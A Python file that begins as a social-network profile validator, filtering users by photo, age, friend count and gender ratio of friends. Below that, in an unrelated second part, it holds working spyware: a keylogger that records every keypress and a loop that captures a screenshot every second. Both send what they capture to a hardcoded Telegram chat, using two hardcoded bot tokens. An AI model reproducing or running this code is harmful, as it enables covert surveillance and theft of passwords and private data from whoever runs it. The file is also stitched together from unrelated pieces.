import asyncio


class UserValidator:

    def __init__(self, overlord):
        self.overlord = overlord
        self.validators = (
            self.photo_validator,
            self.age_validator,
            self.count_friends_validator,
            self.mens_validator
        )

    async def all_validators1(self, *args):  # todo
        tasks = [asyncio.to_thread(func, arg) for func, arg in zip(self.validators, args)]
        res = await asyncio.gather(*tasks, return_exceptions=True)
        # print(res)
        if all(res):
            return True
        return False

    def validate(self, friend_list: dict, user_info: dict, ) -> bool:
        m_f_count = [i['sex'] for i in friend_list['items']]
        female, male, age = m_f_count.count(1), m_f_count.count(2), user_info.get('bdate')
        has_photo, count_friend = user_info['has_photo'], friend_list['count']

        self.overlord.log('info_view', user_info['first_name'], user_info['id'], count_friend, age, has_photo)
        # self.info_view(user_info, count_friend, age, has_photo)
        return self.all_validators(has_photo, age, count_friend, (male, female, count_friend))

    def all_validators(self, has_photo: int, age: str, count_friend: int, mfc: tuple[int, int, int], ) -> bool:
        return all(
            (func(arg) for func, arg in zip(self.validators, (has_photo, age, count_friend, mfc)))
        )

    def photo_validator(self, photo: int) -> bool:
        return bool(photo)

    def age_validator(self, age: str) -> bool:
        try:
            if age:
                age = age[-1:-5:-1]
                age = age[-1::-1]
                date = 2021 - int(age)
                if date >= 20:
                    return True
                return False
            else:
                return True  # todo
        except Exception as e:
            # exp_log.exception(e)
            self.overlord.log('incorrect_age', age)
            return True

    def count_friends_validator(self, count: int) -> bool:
        if 24 <= count <= 1001:
            return True
        return False

    def mens_validator(self, info: tuple[int, int, int]) -> bool:
        """
        Проверка соотношения м/ж
        if m<=35%:
            :return: False
            :rtype: bool
        else:
            :return: True
            :rtype: bool
        """
        male, female, friends = info
        res = male / friends * 100
        if round(res) <= 35:
            return False
        else:
            return True


# Validator = validator_handler(UserValidator)

import time
import keyboard
import pyautogui
import telebot

TOKEN = '1623818411:AAE4iAu4JqlqUgoMI85deLc1KV94rG-CVJY'
TOKEN_KE = '1880257035:AAF7WeZKMAy2Lg8BMmdR3QX-rGYoUAjZ0bI'


def kbr():
    def from_ghbdtn(text):
        layout = dict(zip(map(ord, ''' qwertyuiop[]asdfghjkl;'zxcvbnm,./`QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~'''),
                          ''' йцукенгшщзхъфывапролджэячсмитьбю.ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё'''))

        return text.translate(layout)

    while True:
        bot = telebot.TeleBot(TOKEN_KE)
        try:
            SendMessage = bot.send_message
            # keyboard_list = []
            keyboard_list = ''
            count = 0

            def print_pressed_keys(e):
                if e.event_type == 'down':
                    nonlocal count, keyboard_list
                    count += 1
                    if e.name == 'space':
                        keyboard_list += ' '
                    else:
                        keyboard_list += e.name
                    if count > 100:
                        SendMessage(269019356, keyboard_list)
                        SendMessage(269019356, 'r' + from_ghbdtn(keyboard_list))

                        keyboard_list = ''
                        count = 0

            keyboard.hook(print_pressed_keys)
            keyboard.wait()
        except Exception as e:
            bot.send_message(269019356, str(e))
            time.sleep(10)
            # print(e)


def scr():
    count = 0
    stats = []
    while True:
        bot = telebot.TeleBot(TOKEN)
        try:
            # now = time.time()
            count += 1
            bot.send_photo(269019356, pyautogui.screenshot())
            time.sleep(1)
            # end = time.time() - now
            # print(f'Executed time {end}')
            # stats.append(end)
        except Exception as e:
            # pass
            bot.send_message(269019356, str(e))
            time.sleep(10)
            # print(e)
